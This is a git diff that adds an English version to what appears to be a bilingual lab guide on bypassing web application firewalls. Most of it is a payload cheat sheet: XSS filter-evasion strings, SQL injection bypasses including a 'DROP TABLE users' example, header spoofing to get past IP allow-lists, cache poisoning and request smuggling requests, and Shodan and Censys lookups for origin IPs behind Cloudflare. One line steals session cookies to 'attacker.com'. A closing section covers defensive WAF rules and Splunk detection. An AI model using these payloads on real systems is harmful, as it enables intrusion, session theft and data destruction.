@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # WAF 우회 & 고급 웹 공격 기법
 > AI_Innovation_Studio | WAF Evasion & Advanced Web Attack Lab
 
@@ -953,6 +959,425 @@ SecAction "id:900110,phase:1,nolog,pass,t:none,setvar:tx.inbound_anomaly_score_t
 
 ```spl
 -- Splunk: WAF 우회 패턴 탐지
+index=web_logs status=200
+| eval payload=urldecode(uri_query)
+| rex field=payload "(?i)(?P<xss><[^>]+on\w+=|<script|javascript:)|(?P<sqli>union.{0,20}select|or.{0,10}1=1)"
+| where isnotnull(xss) OR isnotnull(sqli)
+| eval attack_type=if(isnotnull(xss), "XSS", "SQLi")
+| stats count by src_ip, attack_type, uri_path
+| where count > 5
+```
+
+---
+
+<a name="english"></a>
+
+# WAF Bypass & Advanced Web Attack Techniques
+> AI_Innovation_Studio | WAF Evasion & Advanced Web Attack Lab
+
+---
+
+## 1. WAF Detection and Fingerprinting
+
+### Detecting WAF Presence
+
+```bash
+# Compare normal requests vs malicious payload requests
+curl -I https://target.com/                              # Normal
+curl -I "https://target.com/?id=1' OR '1'='1"           # SQL Injection
+curl -I "https://target.com/?q=<script>alert(1)</script>"  # XSS
+
+# 403/406/419/429 → WAF blocking
+# Retry-After header → Rate Limit WAF
+
+# wafw00f tool (automatic WAF detection)
+pip install wafw00f
+wafw00f https://target.com
+wafw00f https://target.com -a  # Try all WAF detections
+```
+
+### Major WAF Fingerprinting
+
+| WAF | Detection Characteristics |
+|-----|--------------------------|
+| **Cloudflare** | `CF-RAY` header, `Server: cloudflare`, 1020/1015 error pages |
+| **AWS WAF** | `x-amzn-RequestId`, `x-amz-apigw-id` headers |
+| **Akamai** | `X-Check-Cacheable`, `Akamai-Cache-Status` headers |
+| **F5 BIG-IP** | `X-WA-Info`, `TS*` prefix cookies |
+| **ModSecurity** | `Mod_Security`, `NOYB` headers, "Not Acceptable" response |
+| **Imperva** | `X-Iinfo` header, `visid_incap_*` cookies |
+| **Barracuda** | `barra_counter_session` cookie |
+
+---
+
+## 2. XSS WAF Filter Bypass Techniques — Complete Cheat Sheet
+
+### Encoding Techniques
+
+```html
+<!-- Original payload -->
+<script>alert(1)</script>
+
+<!-- HTML Entity encoding -->
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+<!-- URL encoding (Single) -->
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+<!-- URL encoding (Double) -->
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+<!-- Unicode variation -->
+<script>alert(1)</script>
+
+<!-- Base64 + eval -->
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+<!-- JavaScript URI -->
+javascript:alert(1)
+javaSCRIPT:alert(1)
+java&#x0A;script:alert(1)
+```
+
+### XSS Without script Tags (Event Handlers)
+
+```html
+<!-- Mouse/pointer events -->
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert`1`">
+<svg onload=alert(1)>
+<body onpageshow=alert(1)>
+<div onmouseover=alert(1)>XSS</div>
+
+<!-- HTML5 new tags/events -->
+<details open ontoggle=alert(1)>
+<audio autoplay onerror=alert(1) src=x>
+<video autoplay onerror=alert(1) src=x>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<meter onmouseover=alert(1)>XSS</meter>
+
+<!-- CSS-based XSS -->
+<link rel=stylesheet href=data:text/css,*{background:url('javascript:alert(1)')}>
+<style>body{background:url('javascript:alert(1)')}</style>
+
+<!-- Form action -->
+<form action=javascript:alert(1)><input type=submit value=XSS>
+<button formaction=javascript:alert(1)>XSS</button>
+```
+
+### WAF Bypass Character Manipulation
+
+```html
+<!-- Null byte insertion -->
+<scri\0pt>alert(1)</scri\0pt>
+
+<!-- Comment insertion -->
+<scr<!--comment-->ipt>alert(1)</script>
+<scr/**/ipt>alert(1)</script>
+
+<!-- Tab/newline/whitespace -->
+<img	src=x onerror=alert(1)>   (tab)
+<img
+src=x onerror=alert(1)>       (newline)
+
+<!-- Mixed case -->
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x OnErRoR=alert(1)>
+
+<!-- HTML5 auto-close -->
+<svg><script>alert(1)</script>  (SVG context)
+
+<!-- Attributes without quotes -->
+<img src=x onerror=alert(1) />
+```
+
+### Polyglot XSS Payloads (Works in Multiple Contexts)
+
+These payloads work across HTML, JavaScript, and URL contexts simultaneously, making them effective against WAFs that only check specific contexts.
+
+---
+
+## 3. SQL Injection WAF Bypass
+
+```sql
+-- Basic payload
+' UNION SELECT 1,2,3--
+
+-- Keyword splitting
+' UN/**/ION SE/**/LECT 1,2,3--
+' UNI%00ON SELECT 1,2,3--
+
+-- Newline splitting
+' UNION%0ASELECT 1,2,3--
+' UNION%0D%0ASELECT 1,2,3--
+
+-- Mixed case
+' uNiOn SeLeCt 1,2,3--
+
+-- Equivalent expression substitution
+AND 1=1   →   AND 1 LIKE 1
+AND 1=1   →   AND 1 BETWEEN 0 AND 2
+OR        →   ||  (MySQL, SQLite)
+UNION     →   UNION ALL
+
+-- Whitespace substitute characters
+TAB (%09), newline (%0A), form feed (%0C), carriage return (%0D)
+/**/, /%%/, %20+%20, ()
+
+-- MySQL version comment bypass
+/*!UNION*/ /*!SELECT*/ 1,2,3
+/*!50000UNION*/ SELECT 1,2,3  (executes on MySQL 5.0.00+)
+
+-- HTTP Parameter Pollution (HPP)
+?id=1&id=UNION&id=SELECT&id=1,2,3--
+?id=1 UNION/*&id=*/SELECT 1,2,3--
+
+-- JSON context
+{"id": "1 UNION SELECT 1,2,3--"}
+{"id": 1, "order": "ASC; DROP TABLE users--"}
+```
+
+---
+
+## 4. HTTP-Level WAF Bypass Techniques
+
+### Chunked Transfer Encoding
+
+Splitting a payload into small chunks via chunked transfer encoding can prevent a WAF from reassembling the full payload, thus bypassing detection.
+
+### HTTP Method Override
+
+```http
+POST /admin/delete HTTP/1.1
+Host: target.com
+X-HTTP-Method-Override: DELETE
+Content-Type: application/json
+
+{"user_id": 123}
+```
+
+### Content-Type Manipulation
+
+```http
+# Change JSON to XML (confuse parsers)
+POST /api/login HTTP/1.1
+Content-Type: application/xml
+
+<root><username>admin' OR '1'='1</username><password>x</password></root>
+```
+
+---
+
+## 5. X-Forwarded-For Injection and IP Spoofing
+
+### XFF Header Abuse
+
+```http
+-- IP whitelist bypass (admin panel access)
+GET /admin HTTP/1.1
+Host: target.com
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+```
+
+### SQL Injection via XFF
+
+```http
+-- When the server directly INSERTs the XFF header into a log DB
+GET /api/resource HTTP/1.1
+X-Forwarded-For: 192.168.1.1', (SELECT password FROM users WHERE id=1))--
+```
+
+### XSS via XFF (Log Viewer)
+
+```http
+-- When the admin log viewer renders XFF as HTML
+GET / HTTP/1.1
+X-Forwarded-For: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+```
+
+---
+
+## 6. Web Cache Poisoning
+
+### Principle
+
+```
+Cache key = URL + Host + Accept-Encoding  (typically)
+Excluded from cache key = X-Forwarded-Host, X-Forwarded-Scheme, etc.
+
+Attack: abuse headers excluded from cache key to store malicious response in cache
+→ All users who request the same URL receive the malicious cached response
+```
+
+### Vulnerable Headers
+
+```http
+-- Test: check if header value is reflected in the response
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: https
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+```
+
+### Cache Poisoning + DOM XSS
+
+```
+Step 1: Confirm X-Forwarded-Host is reflected in the response
+Step 2: Verify <script src="//evil.com/script.js"> is reflected
+Step 3: Repeat requests until the response is cached
+Step 4: Regular users visit the same URL → cached XSS executes
+```
+
+### Web Cache Deception
+
+```
+Attacker → Sends victim a link: https://target.com/account/info.css
+Victim clicks link → Receives authenticated account info page response
+CDN misidentifies .css extension and stores in cache
+Attacker → Accesses same URL → Obtains victim's account data
+```
+
+---
+
+## 7. HTTP Request Smuggling Basics
+
+### CL.TE (Content-Length + Transfer-Encoding Conflict)
+
+```http
+-- Front-end: processes Content-Length first
+-- Back-end: processes Transfer-Encoding first
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+### TE.CL Attack
+
+```http
+-- Front-end: Transfer-Encoding first
+-- Back-end: Content-Length first
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+---
+
+## 8. CDN/WAF Vendor-Specific Bypass Strategies
+
+### Cloudflare — Direct Origin IP Access
+
+```bash
+# Find origin IP using Shodan
+shodan search "ssl.cert.subject.cn:target.com" --fields ip_str
+shodan search "http.title:target.com" --fields ip_str
+
+# Find using Censys
+censys search "443.https.tls.certificate.parsed.names: target.com"
+
+# Check historical DNS records via SecurityTrails
+# → The IP before Cloudflare was enabled may still be the server IP
+
+# Must set Host header for direct access
+curl -H "Host: target.com" https://ORIGIN_IP/ --insecure
+```
+
+### AWS WAF JSON Injection Bypass
+
+```http
+-- AWS WAF parses JSON structure → inject within valid JSON
+POST /api/search HTTP/1.1
+Content-Type: application/json
+
+{"q": {"$gt": ""}, "id": "1 UNION SELECT 1,2,3--"}
+
+-- Base64 encoding bypass (when app decodes Base64 before processing)
+{"query": "MScgVU5JT04gU0VMRUNUIDEsMiwzLS0="}
+```
+
+### ModSecurity OWASP CRS Bypass
+
+```
+Paranoia Level 1 (default): detects only basic attacks
+Paranoia Level 4 (highest): very strict
+
+PL1 bypass:
+  → Simple encoding, case variation is sufficient
+
+PL2 bypass:
+  → Multi-layer encoding, chunked transfer
+
+PL3/4 bypass:
+  → Spread anomaly score (only partial payload per request)
+  → Distribute payload across multiple parameters
+```
+
+---
+
+## 9. Defense and Detection
+
+### WAF Rule Writing Best Practices
+
+```
+Bad WAF rule (easy to bypass):
+   block if request contains "script"
+   → Bypassed with <SCRIPT>, <scr\nipt>, %3Cscript%3E, etc.
+
+Good WAF rule (defense in depth):
+   1. Normalize before checking: URL decode → HTML decode → Unicode normalize
+   2. Context-aware: different filters per parameter type (numeric/string/HTML)
+   3. Positive model: define only allowed patterns (allowlist over blocklist)
+   4. Multi-layer detection: WAF + RASP + IDS combined
+```
+
+### ModSecurity + OWASP CRS Recommended Configuration
+
+```apache
+# modsecurity.conf
+SecRuleEngine DetectionOnly  # Detection-only first → change to On after analysis
+SecRequestBodyAccess On
+SecResponseBodyAccess Off    # Performance optimization
+SecAuditEngine RelevantOnly
+
+# Paranoia Level 2 recommended (PL1 too lenient, PL3/4 too many false positives)
+SecAction "id:900000,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=2"
+
+# Anomaly score threshold
+SecAction "id:900110,phase:1,nolog,pass,t:none,setvar:tx.inbound_anomaly_score_threshold=10"
+```
+
+### Detecting Bypass Attempts via Log Analysis
+
+```spl
+-- Splunk: WAF bypass pattern detection
 index=web_logs status=200
 | eval payload=urldecode(uri_query)
 | rex field=payload "(?i)(?P<xss><[^>]+on\w+=|<script|javascript:)|(?P<sqli>union.{0,20}select|or.{0,10}1=1)"
